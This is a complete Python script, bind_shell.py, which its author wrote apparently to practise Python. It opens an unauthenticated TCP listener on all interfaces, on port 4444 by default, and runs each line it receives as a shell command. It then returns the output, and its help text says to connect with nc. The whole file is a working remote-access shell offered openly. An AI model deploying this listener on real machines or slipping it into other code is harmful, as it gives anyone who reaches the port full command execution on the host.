#!/bin/env python3 

# -----------------------------------------------------------------------------
# File: bind_shell.py
# Description: This is a script to implement a naive bind shell. This is because I felt rusty with python.  
# Usage: ./bind_shell.py --help
# Date: 2024-10-26
# -----------------------------------------------------------------------------

import socket, click, subprocess, os 
from threading import Thread  

verbose = False

def run_cmd(cmd):
    if verbose: print(f"[LOG] Running command: {cmd}")
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True) 
    return output.stdout + output.stderr


# we need to handle multiple commands and send the output back 
def handle_input(client_socket, address):
    client_socket.sendall(b'Type \'exit\' to temrminate connection\n')
    client_socket.sendall(b'$ ')

    while True:
        chunck = client_socket.recv(2048)

        if verbose: print(f"[LOG] Chunck: {chunck}")

        while len(chunck) != 0 and chr(chunck[-1]) != '\n':
            chunck = client_socket.recv(2048)

        cmd = chunck.decode()[:-1]
        
        if cmd.lower() == 'exit':
            client_socket.sendall(b'Bye Bye!\n')
            client_socket.close()
            break
        
        output = run_cmd(cmd)
        client_socket.sendall(output)
        client_socket.sendall(b'\n$ ')
    
    print(f"[LOG] {address} has closed the connection")


@click.command(help='This is a simple bind shell. To connect back to it:\n\n nc 0.0.0.0 PORT')
@click.option('--port', '-p', default=4444, help='Port to bind to.')
@click.option('-v', '--verbose_option', is_flag=True, default=False, help="Enable verbose mode")
def main(port, verbose_option): 
    global verbose 
    
    print(f'Listening for connections on 0.0.0.0:{port}')

    verbose = verbose_option
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.bind(('0.0.0.0', port))
    s.listen(4)

    while True:
        client_socket, address = s.accept()
        print(f"[LOG] New connection from {address}")
        t = Thread(target=handle_input, args=(client_socket, address)) 
        t.start()

if __name__=='__main__':
    main()

